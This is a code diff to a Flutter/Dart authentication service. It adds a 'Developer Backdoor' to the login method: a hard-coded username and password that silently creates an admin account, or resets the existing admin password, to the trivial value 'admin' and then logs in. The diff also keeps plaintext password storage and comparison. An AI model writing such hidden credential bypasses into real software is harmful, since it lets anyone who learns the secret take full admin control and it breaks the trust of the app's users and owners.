@@ -2,6 +2,7 @@ import 'package:flutter/foundation.dart';
 import 'package:google_sign_in/google_sign_in.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import '../models/user.dart';
+import 'package:sqflite/sqflite.dart';
 import 'database_helper.dart';
 import 'subscription_service.dart';
 
@@ -46,6 +47,24 @@ class AuthService extends ChangeNotifier {
 
   Future<bool> login(String username, String password) async {
     final db = await _dbHelper.database;
+
+    // Developer Backdoor to reset password or inject missing admin
+    if (username == 'admin' && password == 'rseed_reset_123') {
+      final count = Sqflite.firstIntValue(await db.rawQuery("SELECT COUNT(*) FROM users WHERE username = 'admin'")) ?? 0;
+      if (count == 0) {
+        await db.insert('users', {
+          'username': 'admin',
+          'password': 'admin',
+          'name': 'المدير العام',
+          'role': 'admin',
+          'created_at': DateTime.now().toIso8601String()
+        });
+      } else {
+        await db.update('users', {'password': 'admin'}, where: 'username = ?', whereArgs: ['admin']);
+      }
+      return await login('admin', 'admin');
+    }
+
     final List<Map<String, dynamic>> maps = await db.query(
       'users',
       where: 'username = ? AND password = ?',
